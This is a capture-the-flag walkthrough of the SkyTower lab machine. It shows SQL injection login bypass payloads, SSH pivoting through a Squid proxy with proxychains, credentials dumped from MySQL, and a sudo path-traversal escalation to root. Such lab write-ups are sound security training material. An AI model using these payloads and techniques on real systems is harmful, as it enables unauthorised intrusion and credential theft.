
SkyTower

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Blind SQL Injection
[+] ProxyChains
[+] SSH with /bin/bash
[+] Getting credentials from MySQL
[+] Privilege Escalation by abusing SUDO rights - /bin/cat
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Scanning

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Host is up (0.00040s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Site doesn't have a title (text/html).
3128/tcp open     http-proxy Squid http proxy 3.1.20
|_http-server-header: squid/3.1.20
|_http-title: ERROR: The requested URL could not be retrieved
MAC Address: 08:00:27:31:58:6E (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


On port 80 there is a login page
![Alt Tag]
Testing for SQL injection
![Alt Tag]

Blind SQL : #1

username : ' oorr 1>0 #

Blind SQL : $2

username : '*'
password: ‘*'

We are logged in and we get the ssh credentials

Username: john
Password: hereisjohn

But the ssh port 22 is filtered
We have a proxy at 3128 open on the machine.

Change the proxychain settings on kali linux

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 	127.0.0.1 9050
http 192.168.56.105 3128
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[ProxyList]

Try to ssh to the server

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/skytower# proxychains ssh john@192.168.56.105
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-192.168.56.105:3128-<><>-192.168.56.105:22-<><>-OK
The authenticity of host '192.168.56.105 (192.168.56.105)' can't be established.
ECDSA key fingerprint is SHA256:QYZqyNNW/Z81N86urjCUIrTBvJ06U9XDDzNv91DYaGc.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.105' (ECDSA) to the list of known hosts.
john@192.168.56.105's password: 
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 20 07:41:08 2014

Funds have been withdrawn
Connection to 192.168.56.105 closed.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We are not getting a regular shell.
Try to access with :proxychains ssh john@192.168.56.105 /bin/bash


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
proxychains ssh john@192.168.56.105 /bin/bash
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-192.168.56.105:3128-<><>-192.168.56.105:22-<><>-OK
john@192.168.56.105's password: 
id
uid=1000(john) gid=1000(john) groups=1000(john)
whoami
john

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Removing the .bashrc file from the home directory of john

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/skytower# proxychains ssh john@192.168.56.106 /bin/bash
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-192.168.56.106:3128-<><>-192.168.56.106:22-<><>-OK
The authenticity of host '192.168.56.106 (192.168.56.106)' can't be established.
ECDSA key fingerprint is SHA256:QYZqyNNW/Z81N86urjCUIrTBvJ06U9XDDzNv91DYaGc.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.106' (ECDSA) to the list of known hosts.
john@192.168.56.106's password: 
ls -al
total 24
drwx------ 2 john john 4096 Jun 20  2014 .
drwxr-xr-x 5 root root 4096 Jun 20  2014 ..
-rw------- 1 john john    7 Jun 20  2014 .bash_history
-rw-r--r-- 1 john john  220 Jun 20  2014 .bash_logout
-rw-r--r-- 1 john john 3437 Jun 20  2014 .bashrc
-rw-r--r-- 1 john john  675 Jun 20  2014 .profile
rm .bashrc
ls -al
total 20
drwx------ 2 john john 4096 Oct  2 06:40 .
drwxr-xr-x 5 root root 4096 Jun 20  2014 ..
-rw------- 1 john john    7 Jun 20  2014 .bash_history
-rw-r--r-- 1 john john  220 Jun 20  2014 .bash_logout
-rw-r--r-- 1 john john  675 Jun 20  2014 .profile
exit

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Loggin in without /bin/bash -  just normal ssh


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/skytower# proxychains ssh john@192.168.56.106
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-192.168.56.106:3128-<><>-192.168.56.106:22-<><>-OK
john@192.168.56.106's password: 
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 20 07:41:08 2014
john@SkyTower:~$ id
uid=1000(john) gid=1000(john) groups=1000(john)
john@SkyTower:~$ sudo -l
[sudo] password for john: 
Sorry, user john may not run sudo on SkyTower.
john@SkyTower:~$ sudo 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Looking at the services running on the server

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
john@SkyTower:~$ netstat -antp
(No info could be read for "-p": geteuid()=1000 but you should be root.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 192.168.56.106:22       192.168.56.106:53879    ESTABLISHED -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::3128                 :::*                    LISTEN      -               
tcp6       0      0 192.168.56.106:3128     192.168.56.102:47628    ESTABLISHED -               
tcp6       0      0 192.168.56.106:53879    192.168.56.106:22       ESTABLISHED -               

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Looking at the index.php in /var/www

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
john@SkyTower:/var/www$ cat login.php
<?php

$db = new mysqli('localhost', 'root', 'root', 'SkyTech');


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Connecting to mysql
username : root
password : root


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 46
Server version: 5.5.35-0+wheezy1 (Debian)

Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Get the database Tables

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| SkyTech            |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.06 sec)

mysql> use SkyTech;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting all users from application

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
mysql> select * from login;
+----+---------------------+--------------+
| id | email               | password     |
+----+---------------------+--------------+
|  1 | john@skytech.com    | hereisjohn   |
|  2 | sara@skytech.com    | ihatethisjob |
|  3 | william@skytech.com | senseable    |
+----+---------------------+--------------+
3 rows in set (0.00 sec)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Connecting as sara

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
john@SkyTower:/var/www$ ssh sara@localhost /bin/bash
sara@localhost's password: 
id
uid=1001(sara) gid=1001(sara) groups=1001(sara)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Sara has sudo -l rigths 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
john@SkyTower:/var/www$ ssh sara@localhost
sara@localhost's password: 
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct  2 06:50:17 2019 from localhost
sara@SkyTower:~$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Sara can run ls and cat as root for the /accounts/ folder

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sara@SkyTower:/$ sudo cat /accounts/../root/
cat: /accounts/../root/: Is a directory
sara@SkyTower:/$ sudo cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
sara@SkyTower:/$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Loggin in as root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sara@SkyTower:/$ ssh root@localhost
The authenticity of host 'localhost (::1)' can't be established.
ECDSA key fingerprint is f6:3b:95:46:6e:a7:0f:72:1a:67:9e:9b:8a:48:5e:3d.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
root@localhost's password: 
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 20 09:01:28 2014
root@SkyTower:~# id;whoami
uid=0(root) gid=0(root) groups=0(root)
root
root@SkyTower:~# 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

